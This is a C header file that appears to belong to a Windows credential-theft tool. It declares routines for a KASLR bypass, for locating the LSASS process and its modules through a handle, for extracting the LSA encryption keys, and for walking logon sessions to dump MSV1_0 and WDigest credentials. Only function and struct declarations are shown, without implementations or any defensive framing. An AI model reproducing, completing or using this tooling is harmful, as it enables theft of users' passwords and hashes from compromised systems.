#pragma once
#include "memory.h"
#include "common.h"

// ----------------------------------------------------------------
// SubCmd 2 results: KASLR bypass
// ----------------------------------------------------------------
typedef struct {
    uint64_t ntos_base;
    uint64_t cr3;
} SubCmd2Info;

BOOL kaslr_bypass(HANDLE h, SubCmd2Info* out);

// ----------------------------------------------------------------
// LSASS location info
// ----------------------------------------------------------------
typedef struct {
    uint64_t eprocess;
    uint64_t dtb;
    uint32_t peb_offset;
} LSASSInfo;

BOOL find_LSASS(HANDLE h, LSASSInfo* out);

// ----------------------------------------------------------------
// Module info
// ----------------------------------------------------------------
typedef struct {
    uint64_t base;
    uint32_t size;
} ModuleInfo;

BOOL find_module(HANDLE h, uint64_t dtb, uint64_t ep, uint32_t peb_off,
                 const wchar_t* target_name, ModuleInfo* out);

// ----------------------------------------------------------------
// LSA encryption keys
// ----------------------------------------------------------------
typedef struct {
    Bytes iv;
    Bytes aes_key;
    Bytes des_key;
} LsaKeys;

void LsaKeys_free(LsaKeys* keys);

BOOL extract_lsa_keys(HANDLE h, uint64_t dtb, uint64_t base, uint32_t size, LsaKeys* out);

// ----------------------------------------------------------------
// Logon session list
// ----------------------------------------------------------------
typedef struct {
    uint64_t list_ptr;
    uint32_t count;
} LogonListInfo;

BOOL find_logon_list(HANDLE h, uint64_t dtb, uint64_t base, uint32_t size, uint32_t build, LogonListInfo* out);

// ----------------------------------------------------------------
// Extract all MSV1_0 informations
// ----------------------------------------------------------------
typedef struct {
    information* items;
    size_t count;
    size_t capacity;
} InformationList;

void InformationList_init(InformationList* list);
void InformationList_push(InformationList* list, const information* item);
void InformationList_free(InformationList* list);

void extract_creds(HANDLE h, uint64_t dtb,
                   uint64_t list_ptr, uint32_t count,
                   uint32_t build,
                   const LsaKeys* keys,
                   InformationList* out);

// ----------------------------------------------------------------
// Extract WDigest informations
// ----------------------------------------------------------------
typedef struct {
    WDigestinformation* items;
    size_t count;
    size_t capacity;
} WDigestList;

void WDigestList_init(WDigestList* list);
void WDigestList_push(WDigestList* list, const WDigestinformation* item);
void WDigestList_free(WDigestList* list);

void extract_wdigest_creds(HANDLE h, uint64_t dtb,
                           uint64_t LSASS_eprocess, uint32_t peb_offset,
                           const LsaKeys* keys,
                           WDigestList* out);
